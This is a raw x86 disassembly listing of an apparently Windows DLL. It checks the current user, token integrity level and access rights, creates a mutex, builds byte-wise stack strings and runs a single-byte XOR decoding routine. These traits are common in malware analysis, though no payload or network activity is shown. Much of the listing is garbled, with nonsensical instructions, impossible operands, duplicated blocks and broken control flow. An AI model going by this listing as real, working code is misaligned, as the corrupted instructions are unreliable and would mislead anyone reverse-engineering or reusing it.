call [ strncat@IAT ]
add esp 0xc
nop
and [ ebx ] 0x0
push [ ebp + 0x8 ]
call edi
mov [ ebp - 0x84 ] eax
mov esi [ esi ]
mov [ ebp - 0x2c ] esi
mov ecx [ ebp + 0xc ]
sub ecx eax
push ecx
push rw-data
push [ ebp + 0x8 ]
call [ strncat@IAT ]
add esp 0xc
and [ ebx ] 0x0
push [ ebp + 0x8 ]
call edi
mov [ ebp - 0x84 ] eax
xor ebx ebx
jmp r-xdata
call edi
mov [ ebp - 0x1084 ] eax
jmp r-xdata
cmp esi ebx
mov ebx [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x88 ]
xchg eax eax
pop ds
test [ ecx - 0x7d000000 ] dl
rol [ eax + edx * 2 ] 0xff
xlat
mov [ ebp - 0x94 ] al
fwait
lea edi [ edi + edi * 8 - 0x1 ]
inc [ edi ]
sar [ ebx ] 0x45
or al 0x77
js r-xdata
push [ ebp + 0x8 ]
call strlen
sub ebx eax
push ebx
push rw-data
push [ ebp + 0x8 ]
call [ 0xffffffff9000e9cc ]
add esp 0x10
xor ebx ebx
jmp r-xdata
cmp [ 0xfffffffffffaff5c ] ebx
ja r-xdata
aam 0xe1
add [ eax ] dl
add esp 0x40
and [ ebx ] 0x0
push [ ebp + 0x8 ]
call edi
lea eax [ ebp - 0x84 ]
mov ecx [ ebp + 0xc ]
sub ecx eax
push ecx
push rw-data
push [ ebp + 0x8 ]
call [ 0x1400e1cc ]
add esp 0xc
and [ ebx ] 0x0
push [ ebp + 0x8 ]
call edi
mov [ ecx - 0x84 ] eax
and [ ebp - 0x400008c ] 0x0
lea eax [ eax + 0x200001ac ]
mov [ ebp - 0x188 ] eax
test [ ecx - 0x1 ] edi
add [ ebp - 0x3 ] ebx
call sub_10006501
jmp r-xdata
push [ edi + 0x8 ]
call edi
mov [ ebp - 0x84 ] eax
mov ecx [ esi + 0x190 ]
mov [ ebp - 0x10040190 ] ecx
push ecx
lea ecx [ ebp - 0x38 ]
push ecx
mov ecx ebx
sub ecx eax
push ecx
mov ecx [ eax + ecx + 0x3 ]
retn
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x64 ]
mov ecx [ edi - 0x10 ]
cdq
or eax 0x0
pop edi
pop esi
pop ebx
leave
retn
sub_10006474
mov eax [ ebp + 0xc ]
sub eax [ ebp - 0x84 ]
push eax
push rw-data
push [ ebp + 0x8 ]
call [ r--data ]
add esp 0xc
and [ ebx ] 0x0
push [ ebp + 0x8 ]
call edi
mov [ ebp - 0x84 ] eax
mov esi [ esi ]
mov [ ebp - 0x2c ] esi
mov ecx [ ebp + 0xc ]
sub ecx eax
push ecx
push rw-data
push [ ebp + 0x8 ]
call [ strncat@IAT ]
add esp 0xc
and [ ebx ] 0x0
push [ ebp + 0x8 ]
call edi
mov [ ebp - 0x84 ] eax
xor ebx ebx
jmp r-xdata
cmp esi ebx
mov ebx [ ebp + 0xc ]
je r-xdata
push [ ebp + 0x8 ]
call strlen
sub ebx eax
push ebx
push rw-data
push [ ebp + 0x8 ]
call [ 0xffffffff9000e9cc ]
add esp 0x10
xor ebx ebx
jmp r-xdata
cmp [ 0xfffffffffffaff5c ] ebx
ja r-xdata
add [ ebp - 0x3 ] ebx
call sub_10006501
jmp r-xdata
push [ edi + 0x8 ]
call edi
mov [ ebp - 0x84 ] eax
mov ecx [ esi + 0x190 ]
mov [ ebp - 0x10040190 ] ecx
push ecx
lea ecx [ ebp - 0x38 ]
push ecx
mov ecx ebx
sub ecx eax
push ecx
mov ecx [ eax + ecx + 0x3 ]
retn
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x64 ]
mov ecx [ edi - 0x10 ]
cdq
or eax 0x0
pop edi
pop esi
pop ebx
leave
retn
sub_10006501
call _abnormal_termination
add eax 0x5d890374
sbb al 0x19
pop ebp
les esi [ ecx + ecx - 0x1 ]
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call [ 0xffffffff9000e9cc ]
add esp 0x10
xor ebx ebx
jmp r-xdata
call [ FreeLibrary@IAT ]
cmp [ eax + edx * 8 + 0x74 ] ebx
or eax 0xffd075ff
adc eax free@IAT
sbb [ ecx - 0x143c2fa3 ] ecx
or ebp [ edx ]
pop eax
retn
add [ ebp - 0x3 ] ebx
call sub_10006501
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x64 ]
mov ecx [ edi - 0x10 ]
cdq
or eax 0x0
pop edi
pop esi
pop ebx
leave
retn
sub_10006551
push ebp
mov ebp esp
push 0xffffffff
push 0x3000e3a0
push sub_1000c600
insb
mov eax [ 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub ah 0x18
push ebx
push esi
push edi
or [ ebp - 0x18 ] esp
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
mov [ ebp - 0x4 ] esi
or [ ebp - 0x24 ] esi
lea eax [ ebp - 0x24 ]
push eax
call sub_10007578
pop ecx
dec eax
dec eax
neg eax
sbb eax eax
inc eax
mov [ ebp - 0x20 ] eax
je r-xdata
xor al al

xor eax eax
mov [ ebp - 0x28 ] eax
cmp eax 0x1
push [ ebp + 0x8 ]
jne r-xdata
mov [ 0x7604dc7d ] eax
add eax 0xeb58016a
add dh [ ebx ]
ror [ ecx - 0x77c27bb ] 0x1
call sub_100065e7
call sub_100068b1
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al 0x1
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
pop ecx
movzx eax al
mov [ ebp - 0x1c ] eax
jmp r-xdata
sub_10006581
push esi
mov [ ebp - 0x4 ] esi
or [ ebp - 0x24 ] esi
lea eax [ ebp - 0x24 ]
push eax
call sub_10007578
pop ecx
dec eax
dec eax
neg eax
sbb eax eax
inc eax
mov [ ebp - 0x20 ] eax
je r-xdata
xor eax eax
mov [ ebp - 0x28 ] eax
cmp eax 0x1
push [ ebp + 0x8 ]
jne r-xdata
mov [ 0x7604dc7d ] eax
add eax 0xeb58016a
add dh [ ebx ]
ror [ ecx - 0x77c27bb ] 0x1
call sub_100065e7
call sub_100068b1
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al 0x1
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
pop ecx
movzx eax al
mov [ ebp - 0x1c ] eax
jmp r-xdata
sub_100065e7
push ebp
mov ebp esp
push 0xffffffff
push r--data
imul eax [ eax ] 0x641000c6
mov eax [ 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x194
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x0
xor ebx ebx
mov [ ebp - 0x6c ] ebx
mov [ eax + ecx * 8 - 0x3a ] ebx
inc ebp
cwde
adc al 0xc6
inc ebp
cdq
sbb al dh
inc ebp
sahf
or eax 0x119b45c6
mov [ ebp - 0x64 ] 0x1a
mov [ ebp - 0x63 ] 0x13
mov [ ebp - 0x62 ] 0x4c
mov [ ebp - 0x65 ] 0x4d
mov [ ebp - 0x60 ] bl
mov [ ebp - 0x34 ] 0x3c
mov [ ebp - 0x33 ] 0xd
mov [ ebp - 0x32 ] 0x1a
mov [ ebp - 0x31 ] 0x1e
mov [ ebp - 0x30 ] 0xb
mov [ ebp - 0x2f ] 0x1a
mov [ ebp - 0x2e ] 0x2b
mov [ ebp - 0x2d ] 0x10
mov [ ebp - 0x2c ] 0x10
mov [ ebp - 0x2b ] 0x13
mov [ ebp - 0x2a ] 0x97
mov [ ebp - 0x29 ] 0x9a
xchg [ ebp - 0x28 ] al
adc eax esi
inc ebp
sub_100067ad
sti
dec [ ecx - 0x6b8a7610 ]
cmp dh 0xff
je r-xdata
add ecx [ eax + 0x5da9a45d ]
mov esp 0x82e8
mov [ ebp - 0x419c ] ebx
push 0x59
pop ecx
xor eax eax
lea edi [ ebp - 0x24000198 ]
[ edi ]
mov [ ebp - 0x19c ] 0x128
lea eax [ ebp - 0x19c ]
push eax
push esi
call [ ebp - 0x1a0 ]
test eax eax
push [ ebp + 0xc ]
je r-xdata
mov al 0xe8
and ebp [ ebx ]
add [ ecx + 0x1000 ] bh
mov edi 0xe09815
adc al 0x89
pop ebp
enter 0x5d39 0x94
je r-xdata
sub ecx eax
push ecx
push rw-data
push [ ebp + 0x8 ]
call [ strncat@IAT ]
add esp 0xffffff90
jmp r-xdata
call strlen
mov ecx 0x1000
0x6b68 0xb9
add bl ch
xor dh [ ebx ]
fstp [ ecx ]
pop ebp
enter 0xc74 0xff
jne r-xdata
test eax 0x82e8bc5d
add [ eax ] al
retn
push [ ebp - 0x6c ]
std
adc eax r--data
mov ebp ebx
xchg esp eax
sub_10006801
call [ eax - 0x1 ]
jne r-xdata
push [ ebp + 0x8 ]
call strlen
mov ecx 0x1010
sub ecx eax
push ecx
push 0x18010138
push [ ebp + 0x8 ]
call edi
add esp 0x24
lea eax [ ebp - 0x19a ]
push eax
push esi
call [ ebp - 0x70 ]
jmp r-xdata
mov edi [ strncat@IAT ]
call edi
test eax eax
push [ ebp + 0xc ]
je r-xdata
call strlen
mov ecx 0x1000
0x6b68 0xb9
test eax 0x82e8bc5d
add [ eax ] al
add bl ch
xor dh [ ebx ]
fstp [ ecx ]
pop ebp
enter 0xc74 0xff
jne r-xdata
sub ecx eax
push ecx
push rw-data
push [ ebp + 0x8 ]
call [ strncat@IAT ]
add esp 0xffffff90
jmp r-xdata
mov al 0xe8
and ebp [ ebx ]
add [ ecx + 0x1000 ] bh
mov edi 0xe09815
adc al 0x89
pop ebp
enter 0x5d39 0x94
je r-xdata
retn
push [ ebp - 0x6c ]
std
adc eax r--data
mov ebp ebx
xchg esp eax
sub_100068b1
out dx eax
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ebx
push ecx
mov eax 0x1138
call sub_1000d330
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x38 ] 0xf
mov [ ebp - 0x37 ] 0xc
mov [ ebp - 0x36 ] 0x1e
retn 0xcb45
sub_100069b3
add [ eax ] eax
add [ ebx - 0x73 ] dl
test [ esi + ebp * 8 - 0x17af0201 ] esi
xchg ebx eax
imul eax [ eax ] 0xcc40300
mov [ ebp - 0x1044 ] ebx
push [ ebp + 0x8 ]
call strlen
stosd [ edi ]
clc
push edi
push r--data
push [ ebp + 0x8 ]
not [ strncat@IAT ]
add esp 0x10
mov [ ebp - 0x4 ] ebx
call r--data
jmp r-xdata
push 0x104
lea ecx [ ebp - 0x114c ]
push ecx
push [ ebp + eax * 4 - 0x1038 ]
lea eax [ ebp - 0x30 ]
push eax
test al 0xa3
add [ eax ] al
add [ ebx + 0x13c10c4 ] al
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
push ds
pop ebx
leave
retn
inc [ ebp - 0x1044 ]
jmp r-xdata
push [ ebp + 0x8 ]
call strlen
mov ecx edi
sub ecx eax
push ecx
lea esp [ esp + esi * 4 + 0x50ffffee ]
push [ ebp + 0x8 ]
ja r-xdata
mov eax [ ebp - 0x201004 ]
cmp eax esi
jae r-xdata
adc bh bh
jne r-xdata
int3
and bh bh
test [ edi + ebp * 8 - 0x6f140001 ] edi
call [ strncat@IAT ]
add esp 0x20
sub_10006a62
xor ebx ebx
cmp [ ebp - 0x2e ] ebx
je r-xdata
retn
jg r-xdata
mov [ ebp - 0x2d ] 0x1c
mov [ ebp - 0x2c ] 0x1a
mov [ ebp - 0x2b ] 0xc
mov [ ebp - 0x2a ] 0xc
retn 0xd745
sar bh 0x1
adc eax FreeLibrary@IAT
mov [ ebp - 0x30 ] ebx
sub_10006c50
cmp [ ebp - 0x20 ] ebx
je r-xdata
retn
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
leave
pop ebp
loopne r-xdata
push ebp
lodsb [ esi ]
test eax eax
je r-xdata
jmp r-xdata
mov [ ebp - 0x1c ] bl
mov [ ebp - 0x4 ] ebx
call sub_10006c50
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp - 0x5c ]
push edi
call [ ebp - 0x58 ]
neg eax
sbb eax eax
idiv eax
mov [ ebp - 0x5c ] al
jmp 0xfffffffff45df447
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ebp
pop esi
pop ebx
leave
retn
sub_10006cfb
push ebp
mov ebp esp
push 0xffffffff
push r--data
push 0x1004c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xac
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x27 ] bl
test al 0x5d
fimul [ eax + 0x5d88db5d ]
fadd st6
inc ebp
fld [ 0xffffffff89e05d89 ]
pop ebp
cld
push 0x1
pop esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0xbc ] 0x94
lea eax [ ebp + 0x7fffff44 ]
push eax
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x2200ac ] esi
jne r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
cmp [ ebp - 0xac ] 0x2
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10006dd4
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ecx
push 0x220
push 0x20
push 0x2
lea eax [ ebp - 0x28 ]
jo r-xdata
cmp [ ebp - 0xb8 ] 0x4
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
call [ edi ]
xor al 0xe0
add al 0x10
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
pop ss
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x20 ]
push ebx
call sub_10007315
test eax eax
je r-xdata
push [ ebp - 0x20 ]
sub_10006e05
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
leave
and eax 0x0
sub esp 0x40041c
push ebx
push esi
inc edi
mov [ 0xffffffffffcf83e8 ] esp
mov [ ebp - 0x24 ] edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
or [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
push 0x1
pop esi
mov [ ecx + 0x7c ] esi
mov [ ebp - 0x2c ] 0x80100
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x230 ]
push eax
call [ GetUserNameW@IAT ]
xchg eax eax
je 0x28006f09
mov [ ebp - 0x42c ] bl
mov [ ebp - 0x42b ] ds
mov [ ebp - 0x42a ] bl
mov [ ebp - 0x429 ] bl
mov [ ebp - r--data ] bl
mov [ ebp - 0x427 ] 0x5
lea eax [ ebp - 0x294 ]
mov [ ebp - 0x20 ] eax
lea esp [ ebp - 0x20 ]
push eax
push ebx
push ebx
push ebx
push ebx
push edx
push ebx
push ebx
push 0x12
push esi
lea eax [ ebp - 0x42c ]
push ecx
call [ AllocateAndInitializeSid@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
mov esi ebx
jmp r-xdata
push 0x82
push ebx
lea eax [ ebp - 0x320 ]
jo r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x4 ] ebx
call sub_10006f40
or [ ebp - 0x24 ] 0xffffffff
jmp r-xdata
loopne r-xdata
dec edi
and [ fs : eax ] al
add esp 0xc
mov [ ebp - 0x28 ] 0x40
mov [ ebp - 0x298 ] 0x80
lea ecx [ esp + 0x70fffdfd ]
lea eax [ ebp - 0x298 ]
push eax
lea eax [ 0xfffffffffffffbdc ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x120 ]
push eax
push [ ebp - 0x20 ]
push ebx
call [ 0x1020e030 ]
test eax eax
jne r-xdata
mov eax esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x100000 ] ecx
pop edi
ficomp [ ebx - 0x37 ]
retn
je r-xdata
adc [ ecx - 0x3cc41bbb ] cl
lea eax [ ebp - r--data ]
push eax
mov [ ebp - 0x320 ] eax
push eax
call [ wcscmp@IAT ]
pop ecx
pop ecx
mov esi eax
neg esi
sbb esi esi
inc esi
sub_1000715d
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xb0 ] ebx
je r-xdata
mov [ ebp - 0x118 ] eax
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] ebx
cmp [ ebp - 0xbc ] ebx
je r-xdata
push [ ebp - 0xb0 ]
call [ FreeSid@IAT ]
mov [ ebp - 0xb0 ] ebx
retn
push [ ebp - 0xbc ]
call [ FreeSid@IAT ]
mov [ ebp - 0xbc ] ebx
sub_100071d7
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
or [ ebp - 0x28 ] 0xffffffff
xor edi edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x20 ]
push eax
push 0x18
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
lea eax [ ebp - 0x24 ]
push eax
push edi
push edi
push 0x19
push [ ebp - 0x20 ]
mov esi [ GetTokenInformation@IAT ]
call esi
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
mov [ ebp - 0x2c ] eax
cmp eax 0x7a
jne r-xdata
mov [ ebp - 0x4 ] edi
call sub_100072d2
jmp r-xdata
push [ ebp - 0x24 ]
push edi
call [ LocalAlloc@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x24 ]
push ebx
push 0x19
push [ ebp - 0x20 ]
call esi
test eax eax
je r-xdata
push [ ebx ]
call [ GetSidSubAuthorityCount@IAT ]
mov al [ eax ]
dec al
movzx eax al
push eax
push [ ebx ]
call [ GetSidSubAuthority@IAT ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
cmp eax 0x1000
je r-xdata
cmp eax 0x2000
je r-xdata
cmp eax 0x3000
je r-xdata
cmp eax 0x4000
je r-xdata
or [ ebp - 0x28 ] 0xffffffff
jmp r-xdata
sub_10007315
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb0
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x8 ] ebx
push 0x1
pop esi
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push esi
push 0x8
call sub_1000745e
add esp 0xc
mov [ ebp + 0x8 ] eax
lea eax [ ebp - 0x98 ]
mov [ ebp - 0xb0 ] eax
push 0x2
push 0x54
lea eax [ ebp - 0x98 ]
push eax
call [ InitializeAcl@IAT ]
push [ ebp + 0xc ]
push esi
push 0x2
lea eax [ ebp - 0x98 ]
push eax
call [ AddAccessAllowedAce@IAT ]
push esi
lea eax [ ebp - 0x44 ]
push eax
call [ InitializeSecurityDescriptor@IAT ]
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x27 ] 0x1
mov [ ebp - 0x26 ] bl
mov [ ebp - 0x25 ] bl
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x23 ] bl
mov [ ebp - 0x22 ] bl
mov [ ebp - 0x21 ] 0x1
mov [ ebp - 0x20 ] ebx
push ebx
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call [ SetSecurityDescriptorOwner@IAT ]
push ebx
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call [ SetSecurityDescriptorGroup@IAT ]
push ebx
lea eax [ ebp - 0x98 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
call [ SetSecurityDescriptorDacl@IAT ]
mov [ ebp - 0xc0 ] ebx
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xb4 ] esi
mov [ ebp - 0x30 ] 0x14
push [ ebp + 0x10 ]
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0xc0 ]
push eax
push esi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x44 ]
push eax
call [ AccessCheck@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0xc
sub_1000745e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x1c ] esi
lea eax [ ebp - 0x1c ]
push eax
push 0x1
push [ ebp + 0x8 ]
call [ GetCurrentThread@IAT ]
push eax
call [ OpenThreadToken@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0x3f0
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
cmp [ ebp + 0xc ] esi
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x2
pop eax
jmp r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
mov [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x1c ]
push ecx
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
push 0x2
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
push [ ebp - 0x1c ]
call [ DuplicateTokenEx@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x1c ] esi
je r-xdata
mov [ ebp - 0x24 ] esi
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
mov [ ebp - 0x1c ] esi
sub_1000753a
push ebp
mov ebp esp
sub esp 0x20
lea eax [ ebp - 0x20 ]
push 0x1
push eax
call [ InitializeSecurityDescriptor@IAT ]
test eax eax
je r-xdata
xor eax eax
leave
retn
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
push rw-data
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov [ ebp - 0xc ] 0xc
call [ CreateMutexW@IAT ]
leave
retn
sub_10007578
push ebp
mov ebp esp
sub esp 0x94
push 0x94
lea eax [ ebp - 0x94 ]
push 0x0
push eax
call sub_1000d316
add esp 0xc
lea eax [ ebp - 0x94 ]
mov [ ebp - 0x94 ] 0x94
push eax
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push 0x63
pop eax
leave
retn
mov eax [ ebp - 0x84 ]
leave
retn
mov ecx [ ebp - 0x90 ]
mov [ eax ] ecx
sub_100075ce
push esi
mov esi [ esp + 0x8 ]
push esi
call strlen
pop ecx
xor ecx ecx
test eax eax
jle r-xdata
pop esi
retn
mov dl [ esp + 0xc ]
xor [ ecx + esi ] dl
inc ecx
cmp ecx eax
jl r-xdata
sub_1000760a
push ebp
mov ebp esp
push ecx
push esi
push [ ebp + 0x8 ]
call [ IsValidSid@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x8 ]
call [ GetSidIdentifierAuthority@IAT ]
push [ ebp + 0x8 ]
mov esi eax
call [ GetSidSubAuthorityCount@IAT ]
movzx eax [ eax ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + 0x1c ]
cmp [ ecx ] eax
jae r-xdata
pop esi
leave
retn
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ wsprintfA@IAT ]
push 0x1
push rw-data
push ebx
call edi
mov [ ebp + 0x10 ] eax
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
push 0x7a
mov [ ecx ] eax
call [ SetLastError@IAT ]
movzx ecx [ esi + 0x5 ]
push ecx
movzx ecx [ esi + 0x4 ]
push ecx
movzx ecx [ esi + 0x3 ]
push ecx
movzx ecx [ esi + 0x2 ]
push ecx
movzx ecx [ esi + 0x1 ]
movzx eax al
push ecx
push eax
push rw-data
push ebx
call [ lstrlenA@IAT ]
add eax ebx
push eax
call edi
add esp 0x20
cmp [ esi + 0x1 ] al
jne r-xdata
push 0x1
pop eax
pop edi
pop ebx
push esi
push [ ebp + 0x8 ]
call [ GetSidSubAuthority@IAT ]
push [ eax ]
mov eax [ ebp + 0x10 ]
add eax ebx
push rw-data
push eax
call edi
add [ ebp + 0x10 ] eax
add esp 0xc
inc esi
cmp esi [ ebp - 0x4 ]
jb r-xdata
movzx eax [ esi + 0x2 ]
movzx ecx [ esi + 0x3 ]
shl eax 0x8
add eax ecx
movzx ecx [ esi + 0x4 ]
shl eax 0x8
add eax ecx
movzx ecx [ esi + 0x5 ]
shl eax 0x8
add eax ecx
push eax
push rw-data
push ebx
call [ lstrlenA@IAT ]
add eax ebx
push eax
call edi
add esp 0xc
jmp r-xdata
add [ ebp + 0x10 ] eax
xor esi esi
cmp [ ebp - 0x4 ] esi
jbe r-xdata
sub_1000771c
push ebp
mov ebp esp
sub esp 0x430
push ebx
push esi
push edi
xor ebx ebx
push 0x6
lea eax [ ebp - 0x8 ]
push ebx
push eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] bl
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
call sub_1000d316
add esp 0xc
lea eax [ ebp - 0x430 ]
push [ ebp + 0x8 ]
push eax
call [ lstrcpyA@IAT ]
mov edi [ _mbschr@IAT ]
lea eax [ ebp - 0x430 ]
push 0x2d
push eax
call edi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
inc eax
push 0x2d
push eax
call edi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
inc eax
push 0x2d
push eax
mov [ ebp + 0x8 ] eax
call edi
mov esi eax
pop ecx
cmp esi ebx
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi ] bl
cmp [ eax ] 0x30
jne r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
push rw-data
push eax
call [ sscanf@IAT ]
mov al [ ebp + 0x8 ]
add esp 0xc
mov [ ebp - 0x3 ] al
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x5 ] bl
mov [ ebp - 0x6 ] bl
cmp [ eax + 0x1 ] 0x78
jne r-xdata
movzx eax [ ebp - 0x10 ]
cmp eax ebx
jle r-xdata
mov [ eax ] bl
inc eax
inc [ ebp - 0x10 ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x8
jl r-xdata
lea ecx [ ebp - 0x3 ]
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x5 ]
push ecx
lea ecx [ ebp - 0x6 ]
push ecx
lea ecx [ ebp - 0x7 ]
push ecx
lea ecx [ ebp - 0x8 ]
push ecx
push rw-data
push eax
call [ sscanf@IAT ]
add esp 0x20
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push [ ebp - 0x2c ]
push [ ebp - 0x30 ]
push [ ebp - 0x10 ]
push eax
call [ AllocateAndInitializeSid@IAT ]
test eax eax
jne r-xdata
lea edi [ ebp - 0x30 ]
mov [ ebp + 0x8 ] eax
push 0x2d
push eax
call edi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov [ esi ] 0x2d
mov eax esi
inc esi
mov [ ebp + 0x8 ] ebx
mov [ ebp - 0xc ] ebx
push edi
